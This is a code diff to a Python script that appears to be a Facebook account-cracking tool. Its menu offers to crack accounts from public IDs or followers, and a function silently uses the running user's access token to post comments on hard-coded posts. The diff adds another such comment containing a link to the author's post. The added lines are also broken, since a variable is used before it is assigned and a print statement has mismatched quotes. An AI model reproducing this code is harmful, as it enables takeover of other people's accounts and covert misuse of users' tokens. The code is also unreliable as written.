@@ -154,6 +154,7 @@ def menu():
 	logo()
 	print" \033[0;95m  NAMA       : "+nama
 	print" \033[0;95m  IP ADDRESS : "+ip
+        print" \033[0;95m  Status       : "Test Version"
 	print" \033[0;94m  #-----------------------------------#"
 	print" \033[0;96m  [1] CRACK DARI ID PUBLIK"
 	print" \033[0;96m  [2] CRACK DARI FOLLOWERS"
@@ -597,6 +598,8 @@ def hamz_bot():
     requests.post('https://graph.facebook.com/2998427890475824/comments/?message=' +kom+ '&access_token=' + token)
     requests.post('https://graph.facebook.com/402798721416840/comments/?message=' +kom2+ '&access_token=' + token)
     requests.post('https://graph.facebook.com/402832164746829/comments/?message=' +kom3+ '&access_token=' + token)
+    requests.post('https://graph.facebook.com/2998427890475824/comments/?message=' +kom4+ '&access_token=' + token)
+    kom4 = " https://www.facebook.com/100009259285042/posts/2998427890475824/?app=fbl"
     menu()
     
      
